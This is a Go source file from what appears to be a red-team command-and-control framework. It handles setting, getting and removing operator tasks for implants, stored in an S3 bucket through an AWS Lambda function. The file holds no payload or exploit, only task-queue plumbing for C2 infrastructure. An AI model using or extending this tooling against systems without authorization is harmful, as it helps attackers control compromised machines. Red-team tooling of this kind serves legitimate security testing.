// package lambdac2 handels all C2-related
// requests, such as setting and getting tasks
package lambdac2

import (
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"

	"github.com/bluesentinelsec/rednimbusc2/pkg/s3wrapper"
	"github.com/bluesentinelsec/rednimbusc2/pkg/tasker"
	log "github.com/sirupsen/logrus"
)

// LambdaReturnObject is a generic object
// used for returning information from the
// Lambda function back to the operator
// or implant
type LambdaReturnObject struct {
	ReturnType string
	Length     int
	Value      []byte
}

var bucket string = "nimbusC2"
var tasksKey string = "tasks/"
var tmp string = "/tmp/"

func RouteTaskToHandler(taskObj *tasker.TaskObject) (LambdaReturnObject, error) {
	var err error
	returnObject := LambdaReturnObject{}
	handler := taskObj.GetLambdaHandler()
	switch handler {
	case "HandleSetLambdaTask":
		err = HandleSetLambdaTask(taskObj)
	case "HandleUpdateLambdaTask":
		err = HandleUpdateLambdaTask(taskObj)
	case "HandleGetLambdaTask":
		returnObject, err = HandleGetLambdaTask(taskObj)
	case "HandleRemoveLambdaTask":
		err = HandleRemoveLambdaTask(taskObj)
	// ToDo: add routes access by target implant
	default:
		e := fmt.Sprintf("received invalid Lambda handler in task object: %v\n", taskObj.GetLambdaHandler())
		return returnObject, errors.New(e)
	}

	return returnObject, err
}

// HandleSetLambdaTask writes the provided task object
// to s3://nimbusc2/tasks/{taskID}
func HandleSetLambdaTask(taskObj *tasker.TaskObject) error {

	log.Info("setting new task")

	log.Debug("converting task to JSON")
	taskJSON, err := json.Marshal(taskObj)
	if err != nil {
		return err
	}

	taskFile := tmp + taskObj.TaskID
	log.Debug("writing task file to disk as: ", taskFile)
	err = ioutil.WriteFile(taskFile, taskJSON, 0600)
	if err != nil {
		return err
	}

	key := tasksKey + taskObj.TaskID
	log.Debugf("writing task to s3://%v/%v", bucket, key)
	err = s3wrapper.PutFile(taskFile, bucket, key)
	if err != nil {
		return err
	}

	log.Info("successfully set task: ", taskObj.TaskID)

	return nil
}

func HandleUpdateLambdaTask(taskObj *tasker.TaskObject) error {
	return errors.New("sorry, HandleUpdateLambdaTask is not implemented")
}

func HandleGetLambdaTask(taskObj *tasker.TaskObject) (LambdaReturnObject, error) {

	log.Info("getting task: ", taskObj.TaskID)
	retObj := LambdaReturnObject{}

	key := tasksKey + taskObj.TaskID
	outFile := tmp + taskObj.TaskID
	log.Debugf("downloading file s3://%v/%v", bucket, key)
	err := s3wrapper.GetFile(bucket, key, outFile)
	if err != nil {
		return retObj, err
	}

	log.Debug("reading task file: ", outFile)
	taskJson, err := ioutil.ReadFile(outFile)
	if err != nil {
		return retObj, err
	}

	// delete this later
	log.Debug(string(taskJson))
	log.Info("successfully obtained task: ", taskObj.TaskID)

	retObj = LambdaReturnObject{
		ReturnType: "get-task",
		Length:     len(taskJson),
		Value:      taskJson,
	}
	return retObj, err
}

func HandleRemoveLambdaTask(taskObj *tasker.TaskObject) error {

	log.Info("deleting task: ", taskObj.TaskID)

	key := tasksKey + taskObj.TaskID
	err := s3wrapper.RemoveFile(bucket, key)
	if err != nil {
		return err
	}

	log.Info("successfully deleted task: ", taskObj.TaskID)

	return nil
}
